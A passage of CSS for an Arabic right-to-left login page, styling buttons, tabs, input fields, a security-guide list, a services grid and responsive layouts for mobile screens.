  margin-bottom: 22px;
  width: 100%;
}

.bm-action-btn {
  width: 100%;
  height: 46px;
  border-radius: 10px;
  font-size: 1.02rem;
  font-weight: 800;
  border: none;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: transform 0.15s ease, opacity 0.15s ease, box-shadow 0.15s ease;
}

.bm-btn-submit {
  background: #026a32;
  color: #ffffff;
  box-shadow: 0 4px 14px rgba(2, 106, 50, 0.25);
}

.bm-btn-submit:hover:not(:disabled) {
  background: #015226;
  transform: translateY(-1px);
}

.bm-btn-submit:disabled {
  background: #94a3b8;
  opacity: 0.65;
  cursor: not-allowed;
}

.bm-btn-cancel {
  background: #f59e0b;
  color: #ffffff;
  box-shadow: 0 4px 14px rgba(245, 158, 11, 0.25);
}

.bm-btn-cancel:hover {
  background: #d97706;
  transform: translateY(-1px);
}

.bm-security-guide-box {
  width: 100%;
  text-align: right;
  direction: rtl;
  margin-top: 4px;
}

.bm-guide-main-heading {
  color: #026a32;
  font-size: 0.96rem;
  font-weight: 800;
  line-height: 1.5;
  margin: 0 0 14px;
}

.bm-guide-steps-list {
  list-style: none;
  padding: 0;
  margin: 0;
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.bm-guide-steps-list li {
  position: relative;
  padding-right: 18px;
  color: #334155;
  font-size: 0.86rem;
  font-weight: 600;
  line-height: 1.65;
}

.bm-guide-steps-list li::before {
  content: "•";
  position: absolute;
  right: 0;
  top: 0;
  color: #1e293b;
  font-size: 1.3rem;
  line-height: 1.2;
  font-weight: 900;
}

@media (max-width: 640px) {
  .login-screen {
    padding: 28px 16px 48px;
    min-height: 100vh;
  }
  .login-main {
    padding: 30px 20px;
    border-radius: 16px;
    max-width: 100%;
    width: 100%;
    box-sizing: border-box;
  }
  .login-logo {
    height: clamp(80px, 20vw, 105px);
    margin-bottom: 24px;
  }
  .field input {
    font-size: 16px; /* Prevents auto-zoom on iOS */
  }
  .account-type-btn {
    height: 46px;
    font-size: 0.96rem;
  }
  .login-submit {
    height: 48px;
    font-size: 1.05rem;
  }
}

/* ============================================================ */
/* ===== واجهة تسجيل الدخول الجديدة (login-n) ================= */
/* ============================================================ */

.login-n-page {
  max-width: 480px;
  margin: 0 auto;
  padding: 24px 20px 40px;
  background: #ffffff;
  direction: rtl;
}

/* شريط اللغة */
.login-n-lang-bar {
  display: flex;
  align-items: center;
  gap: 8px;
  color: #9aa0a6;
  font-size: 18px;
  font-weight: 500;
  margin-bottom: 30px;
}
.login-n-lang-bar svg {
  width: 22px;
  height: 22px;
  color: #9aa0a6;
}

/* الشعار */
.login-n-logo-wrap {
  display: flex;
  justify-content: center;
  margin: 8px 0 24px;
}
.login-n-logo-img {
  width: 180px;
  height: auto;
  max-width: 100%;
  object-fit: contain;
}

/* التبويبات */
.login-n-tabs {
  display: flex;
  gap: 8px;
  margin-bottom: 22px;
}
.login-n-tab {
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 7px;
  padding: 12px 14px;
  border-radius: 10px;
  font-size: 15px;
  font-weight: 700;
  cursor: pointer;
  transition: all .2s;
  border: none;
  font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
  background: #f3f1ee;
  color: #1a1a1a;
}
.login-n-tab .login-n-tab-icon {
  width: 17px;
  height: 17px;
  color: #6b6b6b;
}
.login-n-tab-active {
  background: #5a5a5a !important;
  color: #ffffff !important;
}
.login-n-tab-active:hover {
  background: #4a4a4a !important;
}
.login-n-tab-active .login-n-tab-icon {
  color: #ffffff !important;
}

/* النموذج */
.login-n-form {
  display: flex;
  flex-direction: column;
  gap: 14px;
  margin-bottom: 8px;
}

.login-n-input-wrap {
  position: relative;
  display: flex;
  align-items: center;
  border: 1.5px solid #d9d9d9;
  border-radius: 12px;
  padding: 18px 16px;
  background: #ffffff;
  transition: border-color .15s;
}
.login-n-input-wrap:focus-within {
  border-color: #0c6b3f;
}
.login-n-input-wrap .login-n-input-icon {
  width: 22px;
  height: 22px;
  color: #6b6b6b;
  margin-left: 10px;
  flex-shrink: 0;
}
.login-n-input-wrap input {
  flex: 1;
  border: none;
  outline: none;
  font-size: 16px;
  font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
  background: transparent;
  color: #1a1a1a;
  text-align: right;
  width: 100%;
}
.login-n-input-wrap input::placeholder {
  color: #b0b0b0;
  font-weight: 500;
}
.login-n-input-wrap.login-n-input-error {
  border-color: #e53e3e;
  box-shadow: 0 0 0 3px rgba(229, 62, 62, 0.1);
}

/* رابط نسيت كود المستخدم */
.login-n-forgot {
  text-align: right;
  font-size: 16px;
  font-weight: 700;
  color: #1a1a1a;
  margin-top: 6px;
  margin-bottom: 18px;
}
.login-n-forgot a {
  color: #1a1a1a;
  text-decoration: none;
  border-bottom: 1.5px solid #1a1a1a;
  padding-bottom: 1px;
}
.login-n-forgot a:hover {
  color: #0c6b3f;
  border-color: #0c6b3f;
}

/* زر تسجيل الدخول */
.login-n-login-row {
  display: flex;
  gap: 10px;
  margin-top: 6px;
}
.login-n-login-btn {
  flex: 1;
  background: #0c6b3f;
  color: #ffffff;
  border: none;
  border-radius: 10px;
  font-size: 20px;
  font-weight: 700;
  font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
  cursor: pointer;
  padding: 18px;
  transition: background .2s;
}
.login-n-login-btn:hover {
  background: #0a5a35;
}
.login-n-login-btn:active {
  background: #084a2b;
}
.login-n-login-btn:disabled {
  background: #9aa0a6;
  cursor: not-allowed;
}

/* رابط سجل الآن */
.login-n-register {
  text-align: center;
  margin: 28px 0 14px;
}
.login-n-register a {
  color: #0c6b3f;
  font-size: 19px;
  font-weight: 700;
  text-decoration: none;
  border-bottom: 1.5px solid #0c6b3f;
  padding-bottom: 2px;
}
.login-n-register a:hover {
  color: #084a2b;
  border-color: #084a2b;
}

/* عنوان انضم */
.login-n-join-title {
  text-align: center;
  font-size: 18px;
  font-weight: 700;
  color: #1a1a1a;
  margin-bottom: 60px;
  text-decoration: underline;
  text-underline-offset: 4px;
  margin-top: 0;
}

/* شبكة الخدمات */
.login-n-services {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 8px;
  margin-top: 40px;
}
.login-n-service {
  background: #f4f4f4;
  border-radius: 10px;
  padding: 18px 8px;
  text-align: center;
  cursor: pointer;
  transition: background .2s, transform .15s;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 10px;
  border: none;
  font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
}
.login-n-service:hover {
  background: #ebebeb;
  transform: translateY(-2px);
}
.login-n-service-ico {
  width: 40px;
  height: 40px;
  color: #2a2a2a;
}
.login-n-service-ico-flip {
  transform: scaleX(-1);
}
.login-n-service-label {
  font-size: 12.5px;
  font-weight: 700;
  color: #1a1a1a;
  line-height: 1.4;
}

/* استجابة الشاشات الصغيرة - الجوال والتابلت */
@media (max-width: 768px) {
  .login-n-page { max-width: 100%; padding: 18px 16px 30px; }
  .login-n-lang-bar { font-size: 15px; margin-bottom: 18px; }
  .login-n-lang-bar svg { width: 18px; height: 18px; }
  .login-n-logo-wrap { margin: 4px 0 22px; }
  .login-n-logo-img { width: 150px; max-width: 55vw; }
  .login-n-tabs { gap: 6px; margin-bottom: 16px; }
  .login-n-tab { font-size: 14px; padding: 10px 10px; gap: 5px; }
  .login-n-tab .login-n-tab-icon { width: 15px; height: 15px; }
  .login-n-form { gap: 12px; }
  .login-n-input-wrap { padding: 12px 14px; border-radius: 10px; }
  .login-n-input-wrap .login-n-input-icon { width: 18px; height: 18px; margin-left: 8px; }
  .login-n-input-wrap input { font-size: 14px; }
  .login-n-forgot { font-size: 14px; margin-bottom: 12px; }
  .login-n-login-btn { font-size: 16px; padding: 12px; border-radius: 10px; }
  .login-n-register { margin: 18px 0 10px; }
  .login-n-register a { font-size: 16px; }
  .login-n-join-title { font-size: 16px; margin-bottom: 30px; }
  .login-n-services { grid-template-columns: repeat(4, 1fr); gap: 6px; margin-top: 24px; }
  .login-n-service { padding: 12px 4px; gap: 6px; border-radius: 8px; }
  .login-n-service-ico { width: 30px; height: 30px; }
  .login-n-service-label { font-size: 11px; }
}

@media (max-width: 420px) {
  .login-n-page { padding: 14px 12px 24px; }
  .login-n-logo-img { width: 130px; max-width: 55vw; }
  .login-n-tabs { gap: 5px; margin-bottom: 12px; }
  .login-n-tab { font-size: 13px; padding: 9px 8px; }
  .login-n-form { gap: 10px; }
  .login-n-input-wrap { padding: 10px 12px; }
  .login-n-input-wrap input { font-size: 13px; }
  .login-n-input-wrap .login-n-input-icon { width: 16px; height: 16px; }
  .login-n-login-btn { font-size: 15px; padding: 11px; }
  .login-n-services { gap: 5px; margin-top: 18px; }
  .login-n-service { padding: 10px 3px; }
  .login-n-service-ico { width: 26px; height: 26px; }
  .login-n-service-label { font-size: 10.5px; }
  .login-n-join-title { font-size: 15px; margin-bottom: 22px; }
}
</style>
